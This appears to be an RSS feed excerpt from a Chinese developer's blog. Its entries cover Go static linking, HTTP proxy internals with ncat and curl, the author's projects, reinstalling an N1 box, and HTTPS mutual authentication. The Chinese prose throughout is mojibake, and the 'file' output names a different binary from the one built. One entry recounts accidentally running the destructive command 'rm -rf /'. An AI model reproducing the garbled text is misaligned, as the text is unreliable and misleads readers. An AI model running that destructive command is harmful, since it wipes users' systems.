&lt;p>Golang æœ€å¤§çš„ä¼˜åŠ¿ä¹‹ä¸€å°±æ˜¯æ”¯æŒè·¨å¹³å°ç¼–è¯‘ï¼ŒçœŸæ­£çš„å®ç°äº†Javaçš„æ¢¦æƒ³ï¼šä¸€æ¬¡ç¼–è¯‘ï¼Œåˆ°å¤„è¿è¡Œã€‚&lt;/p>
&lt;p>ä¸è¿‡ï¼Œåœ¨æŸäº›ç‰¹å®šæƒ…å†µä¸‹ï¼Œä¹Ÿä¼šå­˜åœ¨ä¸€äº›ç‰¹æ®Šä¹‹å¤„ã€‚&lt;/p>
&lt;h2 id="é™æ€é“¾æ¥ä¸åŠ¨æ€é“¾æ¥">é™æ€é“¾æ¥ä¸åŠ¨æ€é“¾æ¥&lt;/h2>
&lt;p>&lt;strong>é™æ€é“¾æ¥&lt;/strong>æ˜¯æ˜¯åœ¨ç¼–è¯‘æ—¶å°†ç¨‹åºä¸æ‰€ä¾èµ–çš„æ‰€æœ‰åº“ï¼ˆé€šå¸¸æ˜¯ &lt;code>.a&lt;/code> æˆ– &lt;code>.lib&lt;/code> æ–‡ä»¶ï¼‰ä¸€èµ·æ‰“åŒ…ï¼Œç”Ÿæˆä¸€ä¸ªç‹¬ç«‹çš„å¯æ‰§è¡Œæ–‡ä»¶ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œæ‰€æœ‰éœ€è¦çš„å‡½æ•°å’Œåº“ä»£ç åœ¨ç¼–è¯‘è¿‡ç¨‹ä¸­å°±å·²ç»åµŒå…¥åˆ°å¯æ‰§è¡Œæ–‡ä»¶ä¸­ã€‚&lt;/p>
&lt;p>å› ä¸ºè¿™æ ·ç¼–è¯‘å‡ºæ¥çš„äºŒè¿›åˆ¶æ›´ä¾¿æºï¼Œå®ƒä¸éœ€è¦åœ¨å…¶è¿è¡Œçš„ä¸»æœºç³»ç»Ÿä¸Šå­˜åœ¨åº“ã€‚å› æ­¤ï¼Œä½ çš„äºŒè¿›åˆ¶æ–‡ä»¶å¯ä»¥åœ¨ä»»ä½•ç³»ç»Ÿä¸Šè¿è¡Œï¼Œæ— è®ºå“ªä¸ªå‘è¡Œç‰ˆ/ç‰ˆæœ¬ï¼Œå¹¶ä¸”ä¸ä¾èµ–äºä»»ä½•ç³»ç»Ÿåº“ã€‚&lt;/p>
&lt;p>&lt;strong>åŠ¨æ€é“¾æ¥&lt;/strong>æ˜¯åœ¨ç¨‹åºè¿è¡Œæ—¶ï¼ˆå³æ‰§è¡Œæ—¶ï¼‰å°†ç¨‹åºä¸å…±äº«åº“ï¼ˆå¦‚ &lt;code>.dll&lt;/code>ã€&lt;code>.so&lt;/code> æˆ– &lt;code>.dylib&lt;/code> æ–‡ä»¶ï¼‰é“¾æ¥ã€‚ç¨‹åºæœ¬èº«åŒ…å«å¯¹è¿™äº›åº“çš„å¼•ç”¨ï¼Œè€Œä¸ç›´æ¥åŒ…å«åº“çš„ä»£ç ã€‚ç¨‹åºå¯åŠ¨æ—¶ï¼Œæ“ä½œç³»ç»Ÿä¼šåŠ è½½è¿™äº›åº“æ–‡ä»¶å¹¶é“¾æ¥åˆ°ç¨‹åºã€‚&lt;/p>
&lt;p>è¿™ç§æ–¹å¼çš„ä¼˜ç‚¹æ˜¯æ¯”è¾ƒçµæ´»ï¼Œå¦‚æœä¾èµ–çš„åº“å‘ç”Ÿäº†æ›´æ–°ï¼Œåªè¦æ¥å£æ²¡å˜ï¼Œç¨‹åºä¸éœ€è¦ç¼–è¯‘å°±å¯ä»¥ä½¿ç”¨æœ€æ–°ç‰ˆæœ¬çš„åº“ï¼Œè€Œä¸”å› ä¸ºäºŒè¿›åˆ¶åŒ…å«å¯¹åº“çš„å¼•ç”¨ï¼Œä¸åŒ…å«åº“ä»£ç ï¼Œå› æ­¤æ–‡ä»¶è¾ƒå°ã€‚&lt;/p>
&lt;h2 id="é™æ€é“¾æ¥ç¨‹åº">é™æ€é“¾æ¥ç¨‹åº&lt;/h2>
&lt;p>æˆ‘ä»¬å…ˆæ¥ç¼–å†™ä¸€ä¸ªç®€å•çš„ â€œHello Worldâ€ ç¨‹åºï¼Œï¼Œç»è¿‡æ‰“åŒ…åï¼Œå®ƒå°†æˆä¸ºä¸€ä¸ªé™æ€é“¾æ¥çš„äºŒè¿›åˆ¶æ–‡ä»¶ã€‚&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-go" data-lang="go">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ff79c6">package&lt;/span> main 
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8be9fd;font-style:italic">func&lt;/span> &lt;span style="color:#50fa7b">main&lt;/span>() { 
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8be9fd;font-style:italic">println&lt;/span>(&lt;span style="color:#f1fa8c">&amp;#34;hello world!&amp;#34;&lt;/span>) 
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>æ¥ç€ç¼–è¯‘è¿™ä¸ª Go æ–‡ä»¶ï¼š&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>go build -o main1 main.go
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>ç„¶åä½¿ç”¨Â &lt;code>file&lt;/code>Â å‘½ä»¤æ¥æ£€æŸ¥æ–‡ä»¶ç±»å‹ï¼š&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ file main1 | tr , &lt;span style="color:#f1fa8c">&amp;#39;\n&amp;#39;&lt;/span> 
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>hello_linux: ELF 64-bit LSB executable
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> x86-64
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> version &lt;span style="color:#bd93f9">1&lt;/span> &lt;span style="color:#ff79c6">(&lt;/span>SYSV&lt;span style="color:#ff79c6">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> statically linked
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Go &lt;span style="color:#8be9fd;font-style:italic">BuildID&lt;/span>&lt;span style="color:#ff79c6">=&lt;/span>...
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> with debug_info
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> not stripped
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>ä»ä¸Šè¿°å‘½ä»¤çš„è¾“å‡ºç»“æœå¯çŸ¥ï¼Œ&lt;code>main1&lt;/code>Â æ–‡ä»¶å±äºÂ &lt;strong>64 ä½é™æ€é“¾æ¥çš„ ELF æ ¼å¼&lt;/strong>Â å¯æ‰§è¡Œæ–‡ä»¶ï¼Œé€‚ç”¨äºÂ &lt;strong>x86-64&lt;/strong>Â æ¶æ„ï¼ŒåŒ…å«äº†Â &lt;strong>è°ƒè¯•ä¿¡æ¯&lt;/strong>ï¼Œå¹¶ä¸”æ²¡æœ‰è¿›è¡ŒÂ &lt;strong>å‰¥ç¦»&lt;/strong>ï¼ˆå³ä¿ç•™äº†è°ƒè¯•ç¬¦å·ï¼‰ã€‚&lt;/p></description></item><item><title>HTTPä»£ç†çš„åŸç†å’Œå®ç°</title><link>https://www.typesafe.cn/posts/http-proxy/</link><pubDate>Thu, 02 Jan 2025 00:00:00 +0800</pubDate><guid>https://www.typesafe.cn/posts/http-proxy/</guid><description>&lt;p>HTTP ä»£ç†å¯ä»¥è¯´æ˜¯æ¯ä¸ªå¼€å‘è€…éƒ½ç»•ä¸å¼€çš„å·¥å…·ã€‚å‡ ä¹æ¯å¤©éƒ½ä¼šä½¿ç”¨ï¼Œä½†ä½ çœŸçš„äº†è§£ HTTP ä»£ç†çš„åŸç†å—ï¼Ÿ&lt;/p>
&lt;blockquote>
&lt;p>&lt;strong>è¯´æ˜&lt;/strong>ï¼šè¿™é‡Œè®¨è®ºçš„ HTTP ä»£ç†æ˜¯æŒ‡ HTTP Proxy Serverï¼Œå…·ä½“æ˜¯æ­£å‘ HTTP ä»£ç†æœåŠ¡ç«¯çš„åŸç†å’Œå®ç°ã€‚&lt;/p>&lt;/blockquote>
&lt;p>æƒ³äº†è§£ HTTP ä»£ç†çš„åŸç†ï¼Œæœ€ä¸¥è°¨çš„æ–¹æ³•æ˜¯é˜…è¯» RFC æ–‡æ¡£ï¼Œä½†è¿™åŒæ—¶ä¹Ÿæ˜¯æœ€å›°éš¾çš„æ–¹å¼ã€‚ä»Šå¤©ï¼Œæˆ‘å°†ä»‹ç»ä¸€ç§æ›´ç›´è§‚çš„å­¦ä¹ æŠ€å·§ã€‚&lt;/p>
&lt;p>ä»åå­—ä¸Šå°±å¯ä»¥çœ‹å‡ºï¼ŒHTTP ä»£ç†åŸºäº HTTP åè®®ï¼Œè€Œ HTTP åè®®è¿è¡Œåœ¨ TCP ä¹‹ä¸Šã€‚æˆ‘ä»¬å¯ä»¥ç›´æ¥ç›‘å¬æŸä¸ª TCP ç«¯å£ï¼Œæ¨¡æ‹Ÿ HTTP ä»£ç†æœåŠ¡ç«¯ï¼ŒåŒæ—¶ä½¿ç”¨ &lt;code>curl&lt;/code> å‘½ä»¤é€šè¿‡ä»£ç†è®¿é—®ç½‘ç«™ï¼Œè§‚å¯Ÿå…·ä½“æ•°æ®ï¼Œå†å†³å®šå¦‚ä½•å®ç°è¿™ä¸ª HTTP ä»£ç†æœåŠ¡ç«¯ã€‚&lt;/p>
&lt;hr>
&lt;h2 id="ä»£ç†-http-è¯·æ±‚">ä»£ç† HTTP è¯·æ±‚&lt;/h2>
&lt;p>&lt;strong>æ­¥éª¤ 1&lt;/strong>ï¼šä½¿ç”¨ &lt;code>ncat&lt;/code> ç›‘å¬ç«¯å£ 7788ã€‚&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>ncat -lvp &lt;span style="color:#bd93f9">7788&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;strong>æ­¥éª¤ 2&lt;/strong>ï¼šæ‰§è¡Œ &lt;code>curl&lt;/code> å‘½ä»¤ï¼Œé€šè¿‡ä»£ç†è®¿é—®ç™¾åº¦çš„ HTTP åè®®ã€‚&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>curl http://baidu.com/123?a&lt;span style="color:#ff79c6">=&lt;/span>&lt;span style="color:#bd93f9">1&lt;/span> --proxy 127.0.0.1:7788
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;strong>æ­¥éª¤ 3&lt;/strong>ï¼šæŸ¥çœ‹ &lt;code>ncat&lt;/code> çš„è¾“å‡ºï¼š&lt;/p>
&lt;pre tabindex="0">&lt;code>Ncat: Connection from 127.0.0.1:58458.
GET http://baidu.com/123?a=1 HTTP/1.1
Host: baidu.com
User-Agent: curl/8.7.1
Accept: */*
Proxy-Connection: Keep-Alive
&lt;/code>&lt;/pre>&lt;p>ç¬¬ä¸€è¡Œæ˜¯ &lt;code>ncat&lt;/code> è¾“å‡ºçš„ä¿¡æ¯ï¼Œå¯ä»¥å¿½ç•¥ã€‚åé¢çš„å†…å®¹å®Œå…¨æ˜¯ HTTP åè®®çš„æ•°æ®ã€‚&lt;/p></description></item><item><title>about</title><link>https://www.typesafe.cn/about/</link><pubDate>Wed, 01 Jan 2025 23:36:35 +0800</pubDate><guid>https://www.typesafe.cn/about/</guid><description>&lt;p>ä½ å¥½ï¼Œæˆ‘æ˜¯æœä¸–ç¿”ï¼Œä»äº‹å®‰å…¨å¼€å‘å·¥ä½œã€‚&lt;/p>
&lt;p>æˆ‘ä¸»è¦ä½¿ç”¨ Golangï¼Œå¯¹ Javaã€JavaScriptã€Python ä¹Ÿæ¯”è¾ƒç†Ÿæ‚‰ã€‚&lt;/p>
&lt;hr>
&lt;p>æˆ‘å¼€å‘äº† &lt;a href="https://github.com/dushixiang/next-terminal">Next Terminal&lt;/a> ï¼Œä¸€ä¸ªç®€æ´ã€å®‰å…¨ã€æ˜“ç”¨çš„è¿ç»´å®¡è®¡ç³»ç»Ÿï¼Œæ”¯æŒå¤šç§è¿œç¨‹è®¿é—®åè®®ï¼ŒåŒ…æ‹¬ RDPã€SSHã€VNCã€Telnetã€HTTP ç­‰ï¼Œé€‚ç”¨äºä¼ä¸šçº§è¿ç»´åœºæ™¯ã€‚&lt;/p>
&lt;hr>
&lt;p>ä»¥ä¸‹æ˜¯æˆ‘å¼€æºçš„å…¶ä»–å‡ ä¸ªé¡¹ç›®ï¼š&lt;/p>
&lt;ul>
&lt;li>&lt;strong>&lt;a href="https://github.com/dushixiang/kafka-map">kafka-map&lt;/a>&lt;/strong> ä¸€ä¸ªç¾è§‚ç®€æ´ä¸”å¼ºå¤§çš„kafka webç®¡ç†å·¥å…·ã€‚&lt;/li>
&lt;li>&lt;strong>&lt;a href="https://github.com/dushixiang/4dnat">4dnat&lt;/a>&lt;/strong> ä¸€ä¸ªä¸“é—¨ä¸ºç›®çš„åœ°å€è½¬å‘è€ŒæœåŠ¡çš„å·¥å…·ã€‚&lt;/li>
&lt;/ul></description></item><item><title>è®°ä¸€æ¬¡æ›²æŠ˜çš„N1ç›’å­é‡è£…ç³»ç»Ÿç»å†</title><link>https://www.typesafe.cn/posts/phicomm-n1-system-reinstallation/</link><pubDate>Sun, 28 Jan 2024 19:31:00 +0800</pubDate><guid>https://www.typesafe.cn/posts/phicomm-n1-system-reinstallation/</guid><description>&lt;h2 id="ä¸ºä»€ä¹ˆè¦é‡è£…ç³»ç»Ÿ">ä¸ºä»€ä¹ˆè¦é‡è£…ç³»ç»Ÿï¼Ÿ&lt;/h2>
&lt;p>å€’ä¸æ˜¯ä¸ºäº†æŠ˜è…¾ï¼Œè€Œæ˜¯æˆ‘æ‰‹ä¸Šè¿™å°æ–è®¯ N1 ç›’å­ï¼ˆarmbianç³»ç»Ÿï¼‰åœ¨ä¸Šä¸ªæœˆè®©æˆ‘ä¸å°å¿ƒ &lt;code>rm -rf /&lt;/code> å…¨ç»™åˆ é™¤äº†ï¼Œç­‰æˆ‘ååº”è¿‡æ¥çš„æ—¶å€™å·²ç»ä¸ºæ—¶å·²æ™šã€‚&lt;/p>
&lt;p>ç”±äº Linux ç³»ç»Ÿçš„ç‰¹æ€§ï¼Œæˆ‘è¿è¡Œçš„ç¨‹åºåªè¦ä¸é‡å¯ç³»ç»Ÿéƒ½è¿˜èƒ½æ­£å¸¸ä½¿ç”¨ï¼Œæˆ‘ä¹Ÿæ‡’å¾—ç«‹åˆ»å¤„ç†ï¼Œå°±è¿™æ ·æŒºåˆ°äº†ç°åœ¨ã€‚ç»ˆäºåœ¨æœ¬å‘¨äº”ä¸‹ç­ä¹‹åæˆ‘å¿ƒè¡€æ¥æ½®ï¼Œå‡†å¤‡ç»™å®ƒé‡è£…ä¸€ä¸ªç³»ç»Ÿï¼Œä½†æ²¡æœ‰æƒ³åˆ°è®©æˆ‘èŠ±è´¹äº†å°†è¿‘10ä¸ªå°æ—¶ã€‚&lt;/p>
&lt;h2 id="ç¬¬ä¸€ä¸ªå‘åƒåœ¾ç™¾åº¦äº‘ç›˜ä¸‹è½½é€Ÿåº¦æ„Ÿäºº">ç¬¬ä¸€ä¸ªå‘ï¼Œåƒåœ¾ç™¾åº¦äº‘ç›˜ä¸‹è½½é€Ÿåº¦æ„Ÿäºº&lt;/h2>
&lt;p>N1 ç›’å­æ˜¯ä¸€ä¸ªæ¯”è¾ƒè€çš„è®¾å¤‡äº†ï¼Œåˆ·æœºæ•‘ç –æ•™ç¨‹ä¹Ÿéƒ½æ˜¯2020å¹´æˆ–è€…æ›´æ—©çš„æ—¶å€™å‘å¸ƒçš„ï¼Œé‚£ä¸ªæ—¶å€™æ©å±±è®ºå›ä¸Šçš„å¤§ä½¬ä¸»è¦è¿˜æ˜¯ç”¨ç™¾åº¦äº‘ç›˜æ¥å…±äº«å·¥å…·ã€‚&lt;/p>
&lt;p>æ¯ç§’100KBçš„ä¸‹è½½é€Ÿåº¦ä¸‹è½½1ä¸ªå¤šGBçš„èµ„æ–™è®©äººç­‰çš„ç€æ€¥ã€‚&lt;/p>
&lt;h2 id="ç¬¬äºŒä¸ªå‘åˆ·æœºå·¥å…·ç‰ˆæœ¬ä¹‹å‘">ç¬¬äºŒä¸ªå‘ï¼Œåˆ·æœºå·¥å…·ç‰ˆæœ¬ä¹‹å‘&lt;/h2>
&lt;p>Amlogicçº¿åˆ·å·¥å…· USB Burning Tool æœ‰ä¸¤ä¸ªç‰ˆæœ¬ v3.1.0 å’Œ v2.2.4ï¼Œç†è®ºä¸Šæ¥è¯´ v3.1.0 æ˜¯æ–°çš„ç‰ˆæœ¬ï¼Œæ‰€ä»¥æˆ‘åˆšå¼€å§‹å®‰è£…çš„ä¹Ÿæ˜¯è¿™ä¸ªç‰ˆæœ¬ï¼Œä½†æ˜¯æˆ‘åœ¨ä½¿ç”¨çš„è¿‡ç¨‹ä¸­å„ç§é”™è¯¯ï¼Œè€Œä¸”åˆ†è¾¨ç‡åœ¨æˆ‘4kçš„å±å¹•ä¸Šè¡¨ç°ä¹Ÿå¾ˆç³Ÿç³•ï¼Œæœ€åä¸‹è½½äº† v2.2.4 æ‰èƒ½æ­£å¸¸ä½¿ç”¨ã€‚&lt;/p>
&lt;h2 id="ç¬¬ä¸‰ä¸ªå‘åˆ·æœºå·¥å…·è¯†åˆ«ä¸åˆ°è®¾å¤‡">ç¬¬ä¸‰ä¸ªå‘ï¼Œåˆ·æœºå·¥å…·è¯†åˆ«ä¸åˆ°è®¾å¤‡&lt;/h2>
&lt;p>å‰é¢è¯´äº†ï¼Œæˆ‘çš„ç›’å­ä¸æ˜¯åŸæ¥çš„å®‰å“ç³»ç»Ÿäº†ï¼Œç°åœ¨è¿è¡Œçš„æ˜¯ armbianï¼Œè€Œä¸”ç³»ç»Ÿè¢«æˆ‘ç ´åäº†æ— æ³•æ­£å¸¸å¯åŠ¨ã€‚ä¹Ÿå°±å¯¼è‡´å¸¸è§„æ‰‹æ®µéƒ½æ— æ³•è®©å·¥å…·è¯†åˆ«ï¼Œæˆ‘çœ‹åˆ°æœ‰äººè¯´è®¾å¤‡å…ˆä¸è¦ä¾›ç”µï¼Œå…ˆåœ¨å·¥å…·å¯¼å…¥çƒ§å½•åŒ…ï¼Œç„¶åç‚¹å‡»ã€å¼€å§‹ã€‘ï¼Œå¹¶ä¸”åœ¨3ç§’å†…è¿…é€Ÿä¸Šç”µå°±å¯ä»¥è¯†åˆ«åˆ°å¹¶ä¸”åˆ·æœºäº†ï¼Œæˆ‘åƒä¸ªå‚»å­ä¸€æ ·å°è¯•äº†å¾ˆå¤šéã€‚&lt;/p>
&lt;p>æ¶ˆæ¯æ¥æºï¼šhttps://www.right.com.cn/forum/thread-4041517-1-1.html&lt;/p>
&lt;h2 id="ç¬¬å››ä¸ªå‘åˆ·æœºæŠ¥é”™">ç¬¬å››ä¸ªå‘ï¼Œåˆ·æœºæŠ¥é”™&lt;/h2>
&lt;p>æœ¬æ¥ä¸æƒ³æ‹†çš„ï¼Œå› ä¸ºéº»çƒ¦ï¼Œä½†æœ€ç»ˆæ²¡æœ‰å…¶ä»–åŠæ³•çš„æˆ‘è¿˜æ˜¯æ‹†æœºè¿›è¡Œäº†çŸ­æ¥ï¼Œéœ€è¦ä¸€æŠŠéå¸¸ç»†ä¸”é•¿çš„èºä¸åˆ€å’Œä¸€ä¸ªé•Šå­è¿›è¡ŒçŸ­æ¥ï¼Œå¹¸äºæˆ‘ä¹±ä¸ƒå…«ç³Ÿçš„å·¥å…·æ¯”è¾ƒå¤šï¼Œç¿»ç®±å€’æŸœæ‰¾åˆ°äº†åˆé€‚çš„å·¥å…·ã€‚&lt;/p>
&lt;p>æˆ‘ä¸Šä¸€æ¬¡åˆ·æœºè¿˜æ˜¯å‡ å¹´å‰ï¼Œå…·ä½“çš„è¿‡ç¨‹æˆ‘å·²ç»å¿˜è®°äº†ï¼Œè¿™æ¬¡æˆ‘ä¹Ÿåªä¸‹è½½äº†ä¸€ä¸ª N1 çš„å›ºä»¶ï¼Œåˆ·çš„æ—¶å€™è¿›åº¦åˆ° 1% å°±æŠ¥é”™äº†ï¼Œç„¶åå°±çœ‹åˆ°è¯´è¦å…ˆåˆ· T1 çš„å›ºä»¶ï¼Œå› ä¸ºéœ€è¦ T1 å›ºä»¶ä¸­å‰é¢çš„ä¸€éƒ¨åˆ†ï¼Œæˆ‘åˆä»ç™¾åº¦äº‘ç›˜ä¸‹è½½äº† T1 çš„å›ºä»¶ï¼Œå¹¶ä¸”ä¸¥æ ¼å®‰è£…ç½‘ä¸Šçš„æ•™ç¨‹æ¥å°è¯•ï¼Œä¸å¹¸çš„æ˜¯è¿˜æ˜¯å¤±è´¥äº†ã€‚&lt;/p>
&lt;p>åˆçœ‹åˆ°æœ‰äººè¯´å¯èƒ½æ˜¯USBå£çš„é—®é¢˜ï¼Œæˆ‘ä¾¿æŠŠç”µè„‘ä¸Šçš„6ä¸ªUSBå£éƒ½è¯•äº†ä¸€éï¼Œè¿˜æ˜¯è¡Œä¸é€šã€‚&lt;/p>
&lt;p>ä¸Šç½‘åˆæŸ¥äº†ä¸€ä¸‹ï¼Œè¯´æ˜¯AMDç¡¬ä»¶çš„é—®é¢˜ï¼Œæ¢äº†å› ç‰¹å°”çš„å°±å¥½äº†ã€‚&lt;/p>
&lt;p>WTFï¼Ÿï¼Ÿï¼Ÿ&lt;/p>
&lt;p>è¿™ä¸ªæ—¶å€™å·²ç»å‡Œæ™¨ä¸€ç‚¹é’Ÿï¼Œæå¾—æˆ‘å¿ƒæ€çˆ†ç‚¸ã€‚æ„Ÿè§‰é¢å¯¹è¿™ç§ã€é»‘ç›’å­ã€‘å¤ªæ— åŠ›äº†ï¼Œç«Ÿç„¶è¿˜æœ‰äººèƒ½äº«å—è¿™ä¸ªè¿‡ç¨‹ï¼Œæˆ‘æ˜¯æ— æ³•ç†è§£çš„ã€‚&lt;/p>
&lt;p>æ€»ä¹‹å‘¨äº”æ™šä¸Šä»7ç‚¹é’Ÿå¹²åˆ°å‡Œæ™¨1ç‚¹é’Ÿå¹¶æ²¡æœ‰è§£å†³è¿™ä¸ªé—®é¢˜ã€‚&lt;/p>
&lt;h2 id="ç¬¬äº”ä¸ªå‘uç›˜å¯åŠ¨">ç¬¬äº”ä¸ªå‘ï¼ŒUç›˜å¯åŠ¨&lt;/h2>
&lt;p>å‘¨å…­çš„æ—¶å€™æˆ‘åˆæµ‹è¯•äº†å‡ éåˆ·æœºçš„æ–¹æ¡ˆï¼Œè¿˜æ˜¯è¡Œä¸é€šï¼Œæˆ‘ä¾¿æƒ³ç€ä½¿ç”¨å¸¸è§„Windowså’ŒLinuxè£…ç³»ç»Ÿçš„æ–¹æ¡ˆï¼Œä½¿ç”¨ Uç›˜ å¯åŠ¨æ¥è£…ç³»ç»Ÿã€‚&lt;/p>
&lt;p>æœç´¢äº†ä¸€ä¸‹æ‰¾åˆ°äº†è¿™ä¸ªé¡¹ç›® &lt;a href="https://github.com/ophub/amlogic-s9xxx-armbian">https://github.com/ophub/amlogic-s9xxx-armbian&lt;/a> ï¼Œä»releaseä¸‹è½½åˆ°äº†åˆé€‚çš„å›ºä»¶ï¼Œä¹‹åæ‰¾äº†ä¸€ä¸ªUç›˜æ­é… rufus æŠŠå›ºä»¶å†™å…¥åˆ°äº† Uç›˜ã€‚&lt;/p>
&lt;p>æˆ‘ä¾¿å¼€å§‹äº†Uç›˜å¯åŠ¨ä¹‹æ—…ï¼Œå°´å°¬çš„æ˜¯ N1 å¹¶æ²¡æœ‰ BIOS è¿™ä¸ªä¸œè¥¿ï¼Œæˆ‘æŸ¥è¯¢åˆ°çš„Uç›˜å¯åŠ¨æ–¹æ¡ˆéƒ½æ˜¯åœ¨åŸæ¥å®‰å“ç³»ç»Ÿä¸‹ï¼Œä½¿ç”¨ telnet è¿æ¥ä¸Šä¹‹åæ‰§è¡ŒæŒ‡ä»¤æ¥æ§åˆ¶ä»Uç›˜å¯åŠ¨ï¼Œä½†æ˜¯æˆ‘çš„ N1 åœ¨å¯åŠ¨ä¹‹åä¼šå¡åœ¨å¯åŠ¨ armbian å¤±è´¥çš„é¡µé¢ä¸Šã€‚&lt;/p></description></item><item><title>HTTPS åŒå‘è®¤è¯åŸç†å’Œå®ç°æ–¹å¼</title><link>https://www.typesafe.cn/posts/https-mutual-auth-implementation/</link><pubDate>Thu, 23 Nov 2023 00:00:00 +0800</pubDate><guid>https://www.typesafe.cn/posts/https-mutual-auth-implementation/</guid><description>&lt;p>åŒå‘è®¤è¯çš„å«ä¹‰å°±æ˜¯æœåŠ¡ç«¯å’Œå®¢æˆ·ç«¯éƒ½éœ€è¦éªŒè¯å¯¹æ–¹çš„èº«ä»½ï¼Œç›¸æ¯”æ™®é€šçš„å•å‘è®¤è¯å¤šäº†ä¸€äº›æ­¥éª¤ã€‚&lt;/p>
&lt;h2 id="åŸºç¡€æ¦‚å¿µ">åŸºç¡€æ¦‚å¿µ&lt;/h2>
&lt;p>ä¸‹é¢å…ˆè®²ä¸€äº› https ç›¸å…³çš„æ¦‚å¿µã€‚&lt;/p>
&lt;p>&lt;strong>å¯¹ç§°åŠ å¯†&lt;/strong>&lt;/p>
&lt;p>å¯¹ç§°åŠ å¯†æ˜¯ä¸€ç§åŠ å¯†ç®—æ³•ï¼Œä½¿ç”¨ç›¸åŒçš„å¯†é’¥æ¥åŠ å¯†å’Œè§£å¯†æ•°æ®ã€‚
è¿™æ„å‘³ç€å‘é€å’Œæ¥æ”¶æ–¹éƒ½å¿…é¡»å…±äº«ç›¸åŒçš„å¯†é’¥ã€‚
å¯¹ç§°åŠ å¯†æ˜¯åŠ å¯†é¢†åŸŸä¸­æœ€å¿«çš„ä¸€ç§åŠ å¯†æ–¹å¼ï¼Œå› ä¸ºå®ƒä½¿ç”¨çš„æ˜¯ç›¸å¯¹è¾ƒå°çš„å¯†é’¥å’Œç®€å•çš„è¿ç®—ã€‚&lt;/p>
&lt;p>&lt;strong>éå¯¹ç§°åŠ å¯†&lt;/strong>&lt;/p>
&lt;p>éå¯¹ç§°åŠ å¯†æ˜¯ä¸€ç§å¯†ç å­¦æ–¹æ³•ï¼Œä¸å¯¹ç§°åŠ å¯†ä¸åŒï¼Œå®ƒä½¿ç”¨ä¸€å¯¹å¯†é’¥è€Œä¸æ˜¯ä¸€ä¸ªå¯†é’¥ã€‚
è¿™å¯¹å¯†é’¥åŒ…æ‹¬ä¸€ä¸ªå…¬é’¥å’Œä¸€ä¸ªç§é’¥ã€‚å…¬é’¥ç”¨äºåŠ å¯†æ•°æ®ï¼Œè€Œç§é’¥ç”¨äºè§£å¯†æ•°æ®ã€‚&lt;/p>
&lt;ul>
&lt;li>å…¬é’¥ï¼š å…¬é’¥æ˜¯ä¸€ä¸ªç”¨äºåŠ å¯†çš„å¯†é’¥ï¼Œå¯ä»¥å…¬å¼€è¢«ä»»ä½•äººè®¿é—®ï¼Œå…¬é’¥åŠ å¯†çš„æ•°æ®åªæœ‰ç§é’¥å¯ä»¥è§£å¼€ã€‚&lt;/li>
&lt;li>ç§é’¥ï¼š ç§é’¥æ˜¯ä¸å…¬é’¥é…å¯¹çš„å¦ä¸€ä¸ªå¯†é’¥ï¼Œéœ€è¦å¦¥å–„ä¿ç®¡é¿å…è¢«æ³„éœ²ã€‚&lt;/li>
&lt;li>åŠ å¯†å’Œè§£å¯†ï¼š å¦‚æœä½¿ç”¨å…¬é’¥åŠ å¯†äº†ä¸€æ®µæ•°æ®ï¼Œåªæœ‰æ‹¥æœ‰ç›¸åº”ç§é’¥çš„äººæ‰èƒ½è§£å¯†å®ƒã€‚åä¹‹äº¦ç„¶ï¼Œå¦‚æœä½¿ç”¨ç§é’¥åŠ å¯†äº†æ•°æ®ï¼Œåªæœ‰æ‹¥æœ‰ç›¸åº”å…¬é’¥çš„äººæ‰èƒ½è§£å¯†ã€‚&lt;/li>
&lt;li>æ•°å­—ç­¾åï¼šç®€å•ç‚¹è¯´æ•°å­—ç­¾åå°±æ˜¯ç§é’¥åŠ å¯†æ‘˜è¦ï¼Œè€ŒéåŠ å¯†åŸæ–‡ï¼Œåˆ†ä¸ºä¸‹é¢å‡ ä¸ªæ­¥éª¤ï¼š
&lt;ol>
&lt;li>æ¶ˆæ¯æ‘˜è¦ï¼šä½¿ç”¨å“ˆå¸Œç®—æ³•æŠŠåŸæ–‡ç”Ÿæˆä¸€ä»½æ‘˜è¦ã€‚&lt;/li>
